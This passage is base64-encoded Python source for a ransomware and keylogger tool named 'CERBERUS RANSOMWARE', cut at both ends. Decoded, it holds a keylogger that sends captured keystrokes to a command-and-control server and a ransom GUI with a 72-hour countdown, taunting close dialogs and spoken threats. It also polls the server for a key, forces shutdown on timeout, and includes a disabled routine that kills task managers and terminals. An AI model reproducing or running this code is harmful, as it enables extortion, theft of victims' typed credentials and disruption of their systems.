sZiwgdmljdGltX2lkKToKICAgICAgICBzZWxmLnZpY3RpbV9pZCA9IHZpY3RpbV9pZAogICAgICAgIHNlbGYubG9nX2J1ZmZlciA9ICIiCiAgICAgICAgc2VsZi5sb2NrID0gdGhyZWFkaW5nLkxvY2soKQogICAgICAgIHNlbGYuc3RvcF9ldmVudCA9IHRocmVhZGluZy5FdmVudCgpCiAgICAgICAgCiAgICBkZWYgc3RhcnQoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLmxpc3RlbmVyID0ga2V5Ym9hcmQuTGlzdGVuZXIob25fcHJlc3M9c2VsZi5vbl9wcmVzcykKICAgICAgICAgICAgc2VsZi5saXN0ZW5lci5zdGFydCgpCiAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuZmx1c2hfbG9vcCwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICAgICAgbG9nX2Vycm9yKCJLZXlsb2dnZXIgc3RhcnRlZCBzdWNjZXNzZnVsbHkiKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgbG9nX2Vycm9yKGYiS2V5bG9nZ2VyIFN0YXJ0IEVycm9yOiB7ZX0iKQogICAgICAgIAogICAgZGVmIG9uX3ByZXNzKHNlbGYsIGtleSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBrID0ga2V5LmNoYXIKICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgICAgIGsgPSBmIlt7a2V5Lm5hbWV9XSIKICAgICAgICAKICAgICAgICB3aXRoIHNlbGYubG9jazoKICAgICAgICAgICAgc2VsZi5sb2dfYnVmZmVyICs9IHN0cihrKQogICAgICAgICAgICAKICAgIGRlZiBmbHVzaF9sb29wKHNlbGYpOgogICAgICAgIHdoaWxlIG5vdCBzZWxmLnN0b3BfZXZlbnQuaXNfc2V0KCk6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMTApCiAgICAgICAgICAgIHdpdGggc2VsZi5sb2NrOgogICAgICAgICAgICAgICAgaWYgbm90IHNlbGYubG9nX2J1ZmZlcjoKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZGF0YSA9IHNlbGYubG9nX2J1ZmZlcgogICAgICAgICAgICAgICAgc2VsZi5sb2dfYnVmZmVyID0gIiIKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL2tleWxvZy97c2VsZi52aWN0aW1faWR9IiwganNvbj17ImtleXMiOiBkYXRhfSwgdGltZW91dD0zKQogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGYiU2VudCB7bGVuKGRhdGEpfSBjaGFycyB0byBDMiIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIktleWxvZyB1cGxvYWQgZmFpbGVkOiB7ZX0iKQoKIyAtLS0gR1VJIExvZ2ljIC0tLQpjbGFzcyBSYW5zb213YXJlR1VJOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIG1hc3RlciwgdmljdGltX2lkKToKICAgICAgICBzZWxmLm1hc3RlciA9IG1hc3RlcgogICAgICAgIHNlbGYudmljdGltX2lkID0gdmljdGltX2lkCiAgICAgICAgc2VsZi5kb29tc2RheV90cmlnZ2VyZWQgPSBGYWxzZQogICAgICAgIHNlbGYucGF5bWVudF9tb2RlX2FjdGl2ZSA9IEZhbHNlCgogICAgICAgICMgV0lORE9XRUQgTU9ERSAoTW92YWJsZSwgRmFrZS1DbG9zYWJsZSkKICAgICAgICBtYXN0ZXIudGl0bGUoIkNFUkJFUlVTIFJBTlNPTVdBUkUgLSBFTkNSWVBURUQiKQogICAgICAgIG1hc3Rlci5nZW9tZXRyeSgiMTAyNHg3NjgiKSAKICAgICAgICBtYXN0ZXIuYXR0cmlidXRlcygnLWZ1bGxzY3JlZW4nLCBGYWxzZSkgCiAgICAgICAgbWFzdGVyLm92ZXJyaWRlcmVkaXJlY3QoRmFsc2UpICMgU2hvdyBUaXRsZSBCYXIgKFggYnV0dG9uKQogICAgICAgIG1hc3Rlci5hdHRyaWJ1dGVzKCctdG9wbW9zdCcsIFRydWUpCiAgICAgICAgbWFzdGVyLmNvbmZpZ3VyZShiZz0nIzBhMGEwYScpCiAgICAgICAgbWFzdGVyLnJlc2l6YWJsZShGYWxzZSwgRmFsc2UpCiAgICAgICAgCiAgICAgICAgIyBSQUdFQkFJVCBDTE9TRQogICAgICAgIG1hc3Rlci5wcm90b2NvbCgiV01fREVMRVRFX1dJTkRPVyIsIHNlbGYucmFnZWJhaXRfY2xvc2UpIAogICAgICAgIAogICAgICAgICMgRGlzYWJsZSBtaW5pbWFsaXplL2tleWJvYXJkIHNob3J0Y3V0cwogICAgICAgIG1hc3Rlci5iaW5kKCc8RXNjYXBlPicsIGxhbWJkYSBlOiAiYnJlYWsiKQogICAgICAgIAogICAgICAgICMgQWdncmVzc2l2ZSBMb29wCiAgICAgICAgc2VsZi5mb3JjZV9mb2N1c19sb29wKCkKCiAgICAgICAgIyBHVUkgRWxlbWVudHMKICAgICAgICB0cnk6CiAgICAgICAgICAgIGxvZ29fZGF0YSA9IGJhc2U2NC5iNjRkZWNvZGUoTE9HT19CQVNFNjQpCiAgICAgICAgICAgIHNlbGYubG9nbyA9IFBob3RvSW1hZ2UoZGF0YT1sb2dvX2RhdGEpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLmxvZ28gPSBOb25lCgogICAgICAgIG1haW5fZnJhbWUgPSBGcmFtZShtYXN0ZXIsIGJnPScjMGEwYTBhJykKICAgICAgICBtYWluX2ZyYW1lLnBhY2soZXhwYW5kPVRydWUsIGZpbGw9J2JvdGgnLCBwYWR4PTIwLCBwYWR5PTIwKQoKICAgICAgICBpZiBzZWxmLmxvZ286CiAgICAgICAgICAgIExhYmVsKG1haW5fZnJhbWUsIGltYWdlPXNlbGYubG9nbywgYmc9JyMwYTBhMGEnKS5wYWNrKHBhZHk9MTApCgogICAgICAgIHRpdGxlX2ZvbnQgPSB0a2ZvbnQuRm9udChmYW1pbHk9IkhlbHZldGljYSIsIHNpemU9MjQsIHdlaWdodD0iYm9sZCIpCiAgICAgICAgYm9keV9mb250ID0gdGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTEyKQogICAgICAgIG1vbm9fZm9udCA9IHRrZm9udC5Gb250KGZhbWlseT0iQ291cmllciIsIHNpemU9MTIpCiAgICAgICAgdGltZXJfZm9udCA9IHRrZm9udC5Gb250KGZhbWlseT0iQ291cmllciIsIHNpemU9MzYsIHdlaWdodD0iYm9sZCIpCgogICAgICAgIExhYmVsKG1haW5fZnJhbWUsIHRleHQ9IllPVVIgRklMRVMgSEFWRSBCRUVOIEVOQ1JZUFRFRCIsIGZvbnQ9dGl0bGVfZm9udCwgZmc9JyNmZjRkNGQnLCBiZz0nIzBhMGEwYScpLnBhY2socGFkeT0xMCkKICAgICAgICBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJZb3VyIGRvY3VtZW50cywgcGhvdG9zLCBhbmQgb3RoZXIgaW1wb3J0YW50IGZpbGVzIGhhdmUgYmVlbiBsb2NrZWQuIiwgZm9udD1ib2R5X2ZvbnQsIGZnPScjY2NjY2NjJywgYmc9JyMwYTBhMGEnLCB3cmFwbGVuZ3RoPTcwMCkucGFjayhwYWR5PTUpCiAgICAgICAgCiAgICAgICAgIyBET09NU0RBWSBUSU1FUgogICAgICAgIHNlbGYudGltZV9sZWZ0ID0gNzIgKiAzNjAwIAogICAgICAgIExhYmVsKG1haW5fZnJhbWUsIHRleHQ9IlRJTUUgUkVNQUlOSU5HIFVOVElMIFBFUk1BTkVOVCBEQVRBIExPU1M6IiwgZm9udD10a2ZvbnQuRm9udChmYW1pbHk9IkhlbHZldGljYSIsIHNpemU9MTIsIHdlaWdodD0iYm9sZCIpLCBmZz0nI2ZmMzMzMycsIGJnPScjMGEwYTBhJykucGFjayhwYWR5PSgyMCwgNSkpCiAgICAgICAgc2VsZi50aW1lcl9sYWJlbCA9IExhYmVsKG1haW5fZnJhbWUsIHRleHQ9IjcyOjAwOjAwIiwgZm9udD10aW1lcl9mb250LCBmZz0nI2ZmMDAwMCcsIGJnPScjMGEwYTBhJykKICAgICAgICBzZWxmLnRpbWVyX2xhYmVsLnBhY2socGFkeT01KQogICAgICAgIAogICAgICAgICMgRkFLRSBFWEZJTFRSQVRJT04KICAgICAgICBzZWxmLmV4ZmlsX3N0YXR1cyA9IExhYmVsKG1haW5fZnJhbWUsIHRleHQ9IlN5c3RlbSBTY2FuOiBBbmFseXppbmcgcHJpdmF0ZSBkYXRhLi4uIiwgZm9udD1tb25vX2ZvbnQsIGZnPScjZmZmZjAwJywgYmc9JyMwYTBhMGEnKQogICAgICAgIHNlbGYuZXhmaWxfc3RhdHVzLnBhY2socGFkeT0oMTUsIDUpKQogICAgICAgIHNlbGYuZXhmaWxfcHJvZ3Jlc3MgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJbICAgICAgICAgICAgICAgICAgICBdIDAlIiwgZm9udD1tb25vX2ZvbnQsIGZnPScjZmZmZjAwJywgYmc9JyMwYTBhMGEnKQogICAgICAgIHNlbGYuZXhmaWxfcHJvZ3Jlc3MucGFjaygpCiAgICAgICAgCiAgICAgICAgTGFiZWwobWFpbl9mcmFtZSwgdGV4dD1mIllPVVIgVklDVElNIElEIElTOiIsIGZvbnQ9Ym9keV9mb250LCBmZz0nI2ZmZmZmZicsIGJnPScjMGEwYTBhJykucGFjayhwYWR5PSgyMCwgNSkpCiAgICAgICAgc2VsZi52aWN0aW1faWRfbGFiZWwgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PXNlbGYudmljdGltX2lkLCBmb250PXRrZm9udC5Gb250KGZhbWlseT0iQ291cmllciIsIHNpemU9MjAsIHdlaWdodD0iYm9sZCIpLCBmZz0nIzRkZmY4OCcsIGJnPScjMGEwYTBhJykKICAgICAgICBzZWxmLnZpY3RpbV9pZF9sYWJlbC5wYWNrKCkKCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJTVEFUVVM6IEF3YWl0aW5nIHBheW1lbnQgY29uZmlybWF0aW9uLi4uIChEb24ndCBjbG9zZSB0aGlzIHdpbmRvdykiLCBmb250PWJvZHlfZm9udCwgZmc9JyNmZmZmNGQnLCBiZz0nIzBhMGEwYScpCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwucGFjayhwYWR5PSgyMCwgNSkpCiAgICAgICAgCiAgICAgICAgc2VsZi5rZXlfdmFyID0gU3RyaW5nVmFyKCkKICAgICAgICBzZWxmLmtleV9lbnRyeSA9IEVudHJ5KG1haW5fZnJhbWUsIHRleHR2YXJpYWJsZT1zZWxmLmtleV92YXIsIGZvbnQ9dGtmb250LkZvbnQoZmFtaWx5PSJDb3VyaWVyIiwgc2l6ZT0xMiksIHNob3c9IioiLCB3aWR0aD01MCwgYmc9JyMyYTJhMmEnLCBmZz0nI2ZmZmZmZicsIGluc2VydGJhY2tncm91bmQ9J3doaXRlJywganVzdGlmeT0nY2VudGVyJykKICAgICAgICBzZWxmLmtleV9lbnRyeS5wYWNrKHBhZHk9MTAsIGlwYWR5PTUpCiAgICAgICAgc2VsZi5rZXlfZW50cnkuY29uZmlnKHN0YXRlPSdyZWFkb25seScpCgogICAgICAgIHNlbGYuZGVjcnlwdF9idXR0b24gPSBCdXR0b24obWFpbl9mcmFtZSwgdGV4dD0iREVDUllQVCBGSUxFUyIsIGZvbnQ9dGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTE0LCB3ZWlnaHQ9ImJvbGQiKSwgY29tbWFuZD1zZWxmLnN0YXJ0X2RlY3J5cHRpb24sIGJnPScjZmY0ZDRkJywgZmc9J3doaXRlJywgcGFkeD0yMCwgcGFkeT0xMCkKICAgICAgICBzZWxmLmRlY3J5cHRfYnV0dG9uLnBhY2socGFkeT0xMCkKICAgICAgICBzZWxmLmRlY3J5cHRfYnV0dG9uLmNvbmZpZyhzdGF0ZT0nZGlzYWJsZWQnKSAKICAgICAgICAKICAgICAgICAjIFBBWU1FTlQgQlVUVE9OIChGaXhlZCBMYXlvdXQgLSBQYWNrZWQgYXQgYm90dG9tKQogICAgICAgIHNlbGYucGF5X2J1dHRvbiA9IEJ1dHRvbihtYWluX2ZyYW1lLCB0ZXh0PSJQQVkgUkFOU09NIE5PVyIsIGZvbnQ9dGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTExLCB3ZWlnaHQ9ImJvbGQiKSwgY29tbWFuZD1zZWxmLmVuYWJsZV9wYXltZW50X21vZGUsIGJnPScjMDA3YmZmJywgZmc9J3doaXRlJywgcGFkeD0xNSwgcGFkeT04KQogICAgICAgIHNlbGYucGF5X2J1dHRvbi5wYWNrKHNpZGU9J2JvdHRvbScsIHBhZHk9MjApCgogICAgICAgICMgU3RhcnQgdGhyZWFkcwogICAgICAgIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nID0gVHJ1ZQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuaGVhcnRiZWF0X3BvbGxpbmcsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi51cGRhdGVfdGltZXIsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5mYWtlX2V4ZmlsdHJhdGlvbiwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICAKICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigyMDAwLCBzZWxmLmNoYW5nZV93YWxscGFwZXIpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5hdWRpb19sb29wLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgICMgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi53YXRjaGRvZ19sb29wLCBkYWVtb249VHJ1ZSkuc3RhcnQoKSAjIERJU0FCTEVEOiBDYXVzaW5nIFN5c3RlbSBMYWcKICAgICAgICAKICAgICAgICAjIFNUQVJUIEtFWUxPR0dFUiBBVVRPTUFUSUNBTExZCiAgICAgICAgc2VsZi5rZXlsb2dnZXIgPSBLZXlsb2dnZXIodmljdGltX2lkKQogICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDEwMDAsIHNlbGYua2V5bG9nZ2VyLnN0YXJ0KQogICAgICAgIAogICAgICAgICMgUkFHRUJBSVQgQ0xPU0UgSEFORExFUgogICAgICAgIG1hc3Rlci5wcm90b2NvbCgiV01fREVMRVRFX1dJTkRPVyIsIHNlbGYucmFnZWJhaXRfY2xvc2UpCiAgICAgICAgbWFzdGVyLmJpbmQoIjxBbHQtRjQ+IiwgbGFtYmRhIGU6IHNlbGYucmFnZWJhaXRfY2xvc2UoKSkKCiAgICBkZWYgcmFnZWJhaXRfY2xvc2Uoc2VsZik6CiAgICAgICAgIiIiSW50ZXJjZXB0cyBjbG9zZSByZXF1ZXN0IGFuZCB0cm9sbHMgdGhlIHVzZXIuIiIiCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBtZXNzYWdlYm94LmFza3llc25vKCJFeGl0IEFwcGxpY2F0aW9uIiwgIkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBxdWl0IHRoaXMgYXBwbGljYXRpb24/Iik6CiAgICAgICAgICAgICAgICBtZXNzYWdlYm94LnNob3dlcnJvcigiQWNjZXNzIERlbmllZCIsICJMT0wgeW91IHRob3VnaHQgeW91IGNvdWxkIGVzY2FwZS4gQWNjZXNzIERlbmllZC4iKQogICAgICAgICAgICAgICAgIyBSdW4gVFRTIGluIGEgc2VwYXJhdGUgdGhyZWFkIHRvIGF2b2lkIGJsb2NraW5nIEdVSQogICAgICAgICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5zcGVha19tZXNzYWdlLCBhcmdzPSgiWW91IGNhbm5vdCBsZWF2ZS4iLCksIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgZXhjZXB0OiBwYXNzCgogICAgZGVmIGZvcmNlX2ZvY3VzX2xvb3Aoc2VsZik6CiAgICAgICAgIiIiQWdncmVzc2l2ZWx5IGtlZXBzIHdpbmRvdyBvbiB0b3AsIHVubGVzcyBwYXlpbmcuIERJU0FCTEVEIHRvIGFsbG93IGtleWxvZ2dpbmcuIiIiCiAgICAgICAgIyBESVNBQkxFRDogVGhpcyB3YXMgcHJldmVudGluZyB0aGUgdmljdGltIGZyb20gdXNpbmcgb3RoZXIgYXBwcwogICAgICAgICMgVGhlIGtleWxvZ2dlciBuZWVkcyB0aGUgdmljdGltIHRvIGJlIGFibGUgdG8gdHlwZSBpbiBvdGhlciB3aW5kb3dzCiAgICAgICAgcGFzcwogICAgICAgICMgaWYgbm90IHNlbGYucGF5bWVudF9tb2RlX2FjdGl2ZToKICAgICAgICAjICAgICB0cnk6CiAgICAgICAgIyAgICAgICAgIHNlbGYubWFzdGVyLmxpZnQoKQogICAgICAgICMgICAgIGV4Y2VwdDoKICAgICAgICAjICAgICAgICAgcGFzcwogICAgICAgICMgc2VsZi5tYXN0ZXIuYWZ0ZXIoMzAwMCwgc2VsZi5mb3JjZV9mb2N1c19sb29wKQoKICAgIGRlZiBzcGVha19tZXNzYWdlKHNlbGYsIG1lc3NhZ2UpOgogICAgICAgICIiIkNyb3NzLXBsYXRmb3JtIFRUUy4gU3luY2hyb25vdXMgKGJsb2NraW5nKSB2ZXJzaW9uIGZvciB0aHJlYWRzLiIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgICAgICAgICAgY21kID0gZiJBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5TcGVlY2g7IChOZXctT2JqZWN0IFN5c3RlbS5TcGVlY2guU3ludGhlc2lzLlNwZWVjaFN5bnRoZXNpemVyKS5TcGVhaygne21lc3NhZ2V9JykiCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInBvd2Vyc2hlbGwiLCAiLUNvbW1hbmQiLCBjbWRdLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIHNodXRpbC53aGljaCgiZXNwZWFrIik6CiAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsiZXNwZWFrIiwgbWVzc2FnZV0sIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCiAgICAgICAgICAgICAgICBlbGlmIHNodXRpbC53aGljaCgic3BkLXNheSIpOgogICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInNwZC1zYXkiLCBtZXNzYWdlXSwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgIGRlZiBhdWRpb19sb29wKHNlbGYpOgogICAgICAgICIiIlJlcGVhdHMgdGhlIHZvaWNlIG1lc3NhZ2UgZXZlcnkgMzAgc2Vjb25kcy4iIiIKICAgICAgICBtZXNzYWdlID0gIllvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZC4gUGF5bWVudCBpcyByZXF1aXJlZC4gU3lzdGVtIGZhaWx1cmUgaW1taW5lbnQuIgogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOgogICAgICAgICAgICBzZWxmLnNwZWFrX21lc3NhZ2UobWVzc2FnZSkKICAgICAgICAgICAgdGltZS5zbGVlcCgzMCkKICAgICAgICAgICAgCiAgICBkZWYgd2F0Y2hkb2dfbG9vcChzZWxmKToKICAgICAgICAiIiJLaWxscyB0YXNrIG1hbmFnZXJzIGFuZCB0ZXJtaW5hbHMuIiIiCiAgICAgICAgYmxhY2tsaXN0ID0gWwogICAgICAgICAgICAndGFza21ncicsICdjbWQnLCAncG93ZXJzaGVsbCcsIAogICAgICAgICAgICAnZ25vbWUtdGVybWluYWwtc2VydmVyJywgJ2dub21lLXRlcm1pbmFsJywgIyBHTk9NRQogICAgICAgICAgICAna29uc29sZScsICMgS0RFCiAgICAgICAgICAgICd4ZmNlNC10ZXJtaW5hbCcsICd4dGVybScsICd1eHRlcm0nLAogICAgICAgICAgICAnYmFzaCcsICdzaCcsICd6c2gnLCAnZmlzaCcsICMgU2hlbGxzIChBZ2dyZXNzaXZlKQogICAgICAgICAgICAnaHRvcCcsICd0b3AnLCAnYnRvcCcsICd3aXJlc2hhcmsnCiAgICAgICAgXQogICAgICAgIAogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgICAgICAgICAgZm9yIHByb2MgaW4gYmxhY2tsaXN0OgogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvRiAvSU0ge3Byb2N9LmV4ZSA+bnVsIDI+JjEiKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAjIExpbnV4IE9wdGltaXphdGlvbjogcGtpbGwgaW1wbGllcyBpbnRlcm5hbCBsb29wLCBjYWxsaW5nIGl0IDEweCBwZXIgc2VjIGlzIGJhZC4KICAgICAgICAgICAgICAgICAgICAjIFdlIHJ1biB0aGlzIGV2ZXJ5IDMgc2Vjb25kcyBub3cuCiAgICAgICAgICAgICAgICAgICAgZm9yIHByb2MgaW4gYmxhY2tsaXN0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKGYicGtpbGwgLTkgLWYge3Byb2N9ID4vZGV2L251bGwgMj4mMSIpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgIyBJbmNyZWFzZWQgZnJvbSAxLjBzIHRvIDMuMHMgdG8gcmVkdWNlIHN5c3RlbSBsb2FkL3N0dXR0ZXJpbmcKICAgICAgICAgICAgdGltZS5zbGVlcCgzLjApIAoKICAgIGRlZiBjaGFuZ2Vfd2FsbHBhcGVyKHNlbGYpOgogICAgICAgIHBhc3MKCiAgICBkZWYgdHJpZ2dlcl9kb29tc2RheShzZWxmKToKICAgICAgICBpZiBzZWxmLmRvb21zZGF5X3RyaWdnZXJlZDogcmV0dXJuCiAgICAgICAgc2VsZi5kb29tc2RheV90cmlnZ2VyZWQgPSBUcnVlCiAgICAgICAgCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5zcGVha19tZXNzYWdlLCBhcmdzPSgiVGltZSBoYXMgZXhwaXJlZC4gU3lzdGVtIGZhaWx1cmUgaW1taW5lbnQuIiwpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIHNlbGYubWFzdGVyLmNvbmZpZ3VyZShiZz0nI2ZmMDAwMCcpICMgUkVEIEFMRVJUCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInNodXRkb3duIC9zIC90IDE1IC9jIFwiQ0VSQkVSVVM6IFRJTUUgRVhQSVJFRFwiIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgic2h1dGRvd24gLWggKzEgXCJDRVJCRVJVUzogVElNRSBFWFBJUkVEXCIiKSAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgdXBkYXRlX3RpbWVyKHNlbGYpOgogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nIGFuZCBzZWxmLnRpbWVfbGVmdCA+IDA6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgc2VsZi50aW1lX2xlZnQgLT0gMQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgc2VsZi50aW1lX2xlZnQgPD0gMDoKICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDAsIHNlbGYudHJpZ2dlcl9kb29tc2RheSkKICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDAsIGxhbWJkYTogc2VsZi50aW1lcl9sYWJlbC5jb25maWcodGV4dD0iMDA6MDA6MDAiKSkKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIAogICAgICAgICAgICBtLCBzID0gZGl2bW9kKHNlbGYudGltZV9sZWZ0LCA2MCkKICAgICAgICAgICAgaCwgbSA9IGRpdm1vZChtLCA2MCkKICAgICAgICAgICAgdGltZV9zdHIgPSBmIntoOjAyZH06e206MDJkfTp7czowMmR9IgogICAgICAgICAgICAKICAgICAgICAgICAgIyBUSFJFQUQtU0FGRTogU2NoZWR1bGUgR1VJIHVwZGF0ZSBvbiBtYWluIHRocmVhZAogICAgICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigwLCBsYW1iZGEgdHM9dGltZV9zdHI6IHNlbGYuX3VwZGF0ZV90aW1lcl9kaXNwbGF5KHRzKSkKICAgIAogICAgZGVmIF91cGRhdGVfdGltZXJfZGlzcGxheShzZWxmLCB0aW1lX3N0cik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLnRpbWVyX2xhYmVsLmNvbmZpZyh0ZXh0PXRpbWVfc3RyKQogICAgICAgICAgICBpZiBzZWxmLnRpbWVfbGVmdCA8IDM2MDA6CiAgICAgICAgICAgICAgICBzZWxmLnRpbWVyX2xhYmVsLmNvbmZpZyhmZz0nI2ZmMDAwMCcgaWYgc2VsZi50aW1lX2xlZnQgJSAyID09IDAgZWxzZSAnI2ZmZmZmZicpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgogICAgZGVmIGZha2VfZXhmaWx0cmF0aW9uKHNlbGYpOgogICAgICAgIHN0YWdlcyA9IFsgIlNjYW5uaW5nLi4uIiwgIkNvbXByZXNzaW5nLi4uIiwgIkVuY3J5cHRpbmcuLi4iLCAiQ29ubmVjdGluZy4uLiIsICJVcGxvYWRpbmcuLi4iLCAiQ29tcGxldGUuIiBdCiAgICAgICAgZm9yIHN0YWdlIGluIHN0YWdlczoKICAgICAgICAgICAgaWYgbm90IHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOiBicmVhawogICAgICAgICAgICAjIFRIUkVBRC1TQUZFOiBTY2hlZHVsZSBHVUkgdXBkYXRlIG9uIG1haW4gdGhyZWFkCiAgICAgICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDAsIGxhbWJkYSBzPXN0YWdlOiBzZWxmLmV4ZmlsX3N0YXR1cy5jb25maWcodGV4dD1mIlNUQVRVUzoge3N9IikpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigwLCBsYW1iZGE6IHNlbGYuZXhmaWxfc3RhdHVzLmNvbmZpZyh0ZXh0PSJTVEFUVVM6IFVQTE9BRCBDT01QTEVURSIsIGZnPScjZmYwMDAwJykpCgogICAgZGVmIGhlYXJ0YmVhdF9wb2xsaW5nKHNlbGYpOgogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmIntDMl9TRVJWRVJfVVJMfS9hcGkvc3RhdHVzL3tzZWxmLnZpY3RpbV9pZH0/dGltZV9sZWZ0PXtzZWxmLnRpbWVfbGVmdH0iLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICAgICAgICAgIGlmICJuZXdfdGltZXIiIGluIGRhdGE6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudGltZV9sZWZ0ID0gaW50KGRhdGFbIm5ld190aW1lciJdKQogICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuZ2V0KCJzdGF0dXMiKSA9PSAicmVhZHkiOgogICAgICAgICAgICAgICAgICAgICAgICBrZXkgPSBkYXRhLmdldCgia2V5IikKICAgICAgICAgICAgICAgICAgICAgICAgaWYga2V5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMCwgc2VsZi51cGRhdGVfa2V5X2ZpZWxkLCBrZXkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZyA9IEZhbHNlCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgdGltZS5zbGVlcCg1KSAKCiAgICBkZWYgdXBkYXRlX2tleV9maWVs